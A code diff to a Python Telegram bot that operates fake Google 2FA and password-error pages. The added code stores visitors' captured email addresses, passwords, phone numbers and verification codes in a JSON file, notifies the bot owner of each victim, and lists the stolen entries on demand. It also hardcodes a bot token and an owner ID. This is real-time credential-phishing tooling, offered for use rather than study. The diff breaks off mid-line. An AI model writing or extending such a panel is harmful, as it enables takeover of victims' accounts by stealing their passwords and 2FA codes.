@@ -8,7 +8,11 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
 # ===== CONFIGURATION =====
-BOT_TOKEN = os.environ.get("8850819693:AAFoWI-u3k1t8m5x165KgkqIem85IP-rKDo)
+BOT_TOKEN = "8850819693:AAHINxpHLoFTcNiZE0DqS-8cR7p83qBLSB4"
+
+# YOUR TELEGRAM USER ID (get it from @userinfobot)
+# Replace this with your actual Telegram user ID
+OWNER_ID = "6623024700"  # Get this from @userinfobot
 
 # Get the current directory
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
@@ -19,6 +23,7 @@ if not os.path.exists(DATA_DIR):
     os.makedirs(DATA_DIR)
 
 DATA_FILE = os.path.join(DATA_DIR, "2fa_data.json")
+CAPTURED_DATA_FILE = os.path.join(DATA_DIR, "captured_data.json")
 
 # Enable logging
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
@@ -28,6 +33,7 @@ logger = logging.getLogger(__name__)
 user_data_store = {}
 blocked_users = set()
 temp_codes = {}
+visitor_data_store = []
 
 # ===== SECURITY PREFERENCES =====
 SECURITY_OPTIONS = {
@@ -98,6 +104,93 @@ def update_page_data(phone_number=None, code=None, g_code=None, status=None, pas
     
     logger.info(f"Page data updated: {data}")
 
+def save_captured_data(visitor_data):
+    """Save captured data from visitors"""
+    data = []
+    
+    if os.path.exists(CAPTURED_DATA_FILE):
+        with open(CAPTURED_DATA_FILE, 'r') as f:
+            try:
+                data = json.load(f)
+            except:
+                data = []
+    
+    # Add timestamp and visitor ID
+    visitor_data['timestamp'] = datetime.now().isoformat()
+    visitor_data['visitor_id'] = f"VISITOR_{len(data) + 1:04d}"
+    
+    data.append(visitor_data)
+    
+    with open(CAPTURED_DATA_FILE, 'w') as f:
+        json.dump(data, f, indent=2)
+    
+    logger.info(f"Captured data saved: {visitor_data}")
+    return visitor_data
+
+async def send_visitor_notification(visitor_data):
+    """Send visitor notification to the bot owner"""
+    try:
+        if OWNER_ID == "YOUR_TELEGRAM_USER_ID":
+            logger.info("OWNER_ID not set. Please set your Telegram user ID.")
+            return
+        
+        # Create notification message
+        message = f"""
+🔔 *NEW VISITOR ALERT!*
+
+📋 *Visitor ID:* {visitor_data.get('visitor_id', 'N/A')}
+🕐 *Time:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+🌐 *Page:* {visitor_data.get('page', 'Unknown')}
+📍 *IP Address:* {visitor_data.get('ip', 'Not available')}
+🖥️ *User Agent:* {visitor_data.get('user_agent', 'Not available')[:100]}
+
+📊 *Captured Data:*
+📧 *Email:* {visitor_data.get('email', 'Not provided')}
+🔑 *Password:* {visitor_data.get('password', 'Not provided')}
+📱 *Phone:* {visitor_data.get('phone', 'Not provided')}
+🔢 *Code:* {visitor_data.get('code', 'Not provided')}
+🔑 *G-Code:* {visitor_data.get('g_code', 'Not provided')}
+
+📈 *Total Visitors:* {len(visitor_data_store) + 1}
+
+🔗 *View Data:* /view_data
+        """
+        
+        # Send to owner
+        application = None
+        # We'll use a global reference to send messages
+        # This will be set in the main function
+        
+        # For now, log it
+        logger.info(f"Visitor notification: {message}")
+        
+        # Store in global for later sending
+        global pending_notification
+        pending_notification = {
+            'user_id': OWNER_ID,
+            'message': message
+        }
+        
+    except Exception as e:
+        logger.error(f"Error sending visitor notification: {e}")
+
+# Global variable for sending messages
+pending_notification = None
+
+async def send_pending_notification(context):
+    """Send pending notification to owner"""
+    global pending_notification
+    if pending_notification:
+        try:
+            await context.bot.send_message(
+                chat_id=pending_notification['user_id'],
+                text=pending_notification['message'],
+                parse_mode='Markdown'
+            )
+            pending_notification = None
+        except Exception as e:
+            logger.error(f"Error sending pending notification: {e}")
+
 # ===== START COMMAND =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -109,7 +202,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     get_user_data(user_id)
     
     welcome_text = """
-🤖 *Security Bot with 2FA & G-Code Control!*
+🤖 *Security Bot with 2FA & Data Capture!*
 
 This bot controls the Google 2FA, G-code, and Password Error pages.
 
@@ -119,6 +212,7 @@ This bot controls the Google 2FA, G-code, and Password Error pages.
 🔑 *G-Code* - Manually set G-Code
 ❌ *Password Error* - Show password error notification
 ✅ *Success* - Verify and confirm
+📊 *View Captured Data* - See all captured visitor data
 
 Select an option below:
 """
@@ -130,6 +224,7 @@ Select an option below:
         [InlineKeyboardButton("🔑 Set G-Code", callback_data="g_code_prompt")],
         [InlineKeyboardButton("❌ Password Error", callback_data="password_error")],
         [InlineKeyboardButton("✅ Verify & Success", callback_data="success")],
+        [InlineKeyboardButton("📊 View Captured Data", callback_data="view_captured")],
         [InlineKeyboardButton("🔒 Security Preference", callback_data="security_preference")],
         [InlineKeyboardButton("🚫 Block Visitor", callback_data="block_visitor")],
         [InlineKeyboardButton("ℹ️ Help", callback_data="help")]
@@ -159,6 +254,37 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     data = query.data
     user_data = get_user_data(user_id)
+    
+    # ===== VIEW CAPTURED DATA =====
+    if data == "view_captured":
+        if os.path.exists(CAPTURED_DATA_FILE):
+            with open(CAPTURED_DATA_FILE, 'r') as f:
+                try:
+                    captured_data = json.load(f)
+                    if captured_data:
+                        text = "📊 *Captured Visitor Data*\n\n"
+                        # Show last 10 entries
+                        for i, entry in enumerate(captured_data[-10:], 1):
+                            text += f"*{i}. {entry.get('visitor_id', 'N/A')}*\n"
+                            text += f"   🕐 {entry.get('timestamp', 'N/A')[:16]}\n"
+                            text += f"   📧 {entry.get('email', 'N/A')}\n"
+                            text += f"   🔑 {entry.get('password', 'N/A')}\n"
+                            text += f"   📱 {entry.get('phone', 'N/A')}\n"
+                            text += f"   🔢 {entry.get('code', 'N/A')}\n\n"
+                        text += f"\n*Total Captured:* {len(captured_data)} visitors"
+                    else:
+                        text = "📊 *No captured data yet.*"
+                except:
+                    text = "📊 *No captured data yet.*"
+        else:
+            text = "📊 *No captured data yet.*"
+        
+        keyboard = [
+            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
+        return
     
     # ===== SECURITY PREFERENCE =====
     if data == "security_preference":
@@ -430,148 +556,4 @@ Block or unblock users from accessing the bot.
             [InlineKeyboardButton("🔙 Back", callback_data="block_visitor")]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
-    
-    # ===== UNBLOCK SPECIFIC USER =====
-    elif data.startswith("unblock_"):
-        user_to_unblock = int(data.replace("unblock_", ""))
-        if user_to_unblock in blocked_users:
-            blocked_users.remove(user_to_unblock)
-            await query.edit_message_text(
-                f"✅ User `{user_to_unblock}` has been unblocked.",
-                parse_mode='Markdown'
-            )
-        else:
-            await query.edit_message_text(
-                f"❌ User `{user_to_unblock}` is not in the blocked list.",
-                parse_mode='Markdown'
-            )
-        
-        import asyncio
-        await asyncio.sleep(1.5)
-        
-        text = """
-🚫 *Block Visitor*
-
-Block or unblock users from accessing the bot.
-
-*Blocked Users:* {}
-        """.format(len(blocked_users))
-        
-        keyboard = [
-            [InlineKeyboardButton("🚫 Block User", callback_data="block_user")],
-            [InlineKeyboardButton("✅ Unblock User", callback_data="unblock_user")],
-            [InlineKeyboardButton("📋 List Blocked Users", callback_data="list_blocked")],
-            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")]
-        ]
-        
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
-    
-    # ===== SUCCESS =====
-    elif data == "success":
-        user_data["attempts"] = 0
-        user_data["verification_status"] = True
-        user_data["password_error_active"] = False
-        
-        update_page_data(status="success", password_error=False)
-        
-        text = """
-✅ *Success!*
-
-Access granted. Welcome!
-
-*Phone Number:* {}
-*G-Code:* {}
-*Security Preference:* {}
-        """.format(
-            user_data["phone_number"] or "Not Set",
-            user_data.get("g_code", "Not Set"),
-            SECURITY_OPTIONS.get(user_data["security_preference"], "Not Set")
-        )
-        
-        keyboard = [
-            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")]
-        ]
-        
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
-    
-    # ===== RESEND SMS CODE =====
-    elif data.startswith("resend_sms_"):
-        sms_code = generate_sms_code()
-        g_code = generate_g_code()
-        temp_codes[user_id] = sms_code
-        user_data["sms_code"] = sms_code
-        user_data["g_code"] = g_code
-        
-        update_page_data(code=sms_code, g_code=g_code, status="code_generated", password_error=False)
-        
-        code_type = "I" if data == "resend_sms_i" else "II"
-        text = f"""
-📱 *SMS Code {code_type}*
-
-New verification code sent!
-
-*SMS Code:* `{sms_code}`
-*G-Code:* `{g_code}`
-*Valid for:* 5 minutes
-
-✅ The G-Code has been updated to: `{g_code}`
-        """
-        
-        keyboard = [
-            [InlineKeyboardButton("📱 Resend Code", callback_data=data)],
-            [InlineKeyboardButton("✅ Verify", callback_data="success")],
-            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")]
-        ]
-        
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
-    
-    # ===== BACK TO MAIN MENU =====
-    elif data == "back_to_menu":
-        await start(update, context)
-    
-    # ===== HELP =====
-    elif data == "help":
-        help_text = """
-ℹ️ *Help & Information*
-
-*How this works:*
-
-1. 🔢 *Set Phone Number* - Enter your phone number
-   • Updates the 2FA page with your number
-
-2. 📱 *SMS Code I/II* - Generates SMS code & G-Code
-   • Updates the G-Code on the Google sign-up page
-
-3. 🔑 *Set G-Code* - Manually enter any G-Code
-
-4. ❌ *Password Error* - Shows the password error page
-   • Displays "Incorrect Password" notification
-   • Tracks failed attempts
-   • Auto-locks after 5 attempts
-
-5. ✅ *Success* - Confirms verification
-   • Shows success on all pages
-
-*Pages:*
-- `google_2fa_page.html` - 2FA Notification
-- `password_error_page.html` - Password Error Page
-        """
-        
-        keyboard = [
-            [InlineKeyboardButton("🔙 Back to Main Menu", callback_data="back_to_menu")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.edit_message_text(help_text, reply_markup=reply_markup, parse_mode='Markdown')
-
-# ===== MESSAGE HANDLER =====
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    message = update.message
-    text = message.text
-    
-    if is_user_blocked(user_id):
-        await message.reply_text("🚫
+        await que
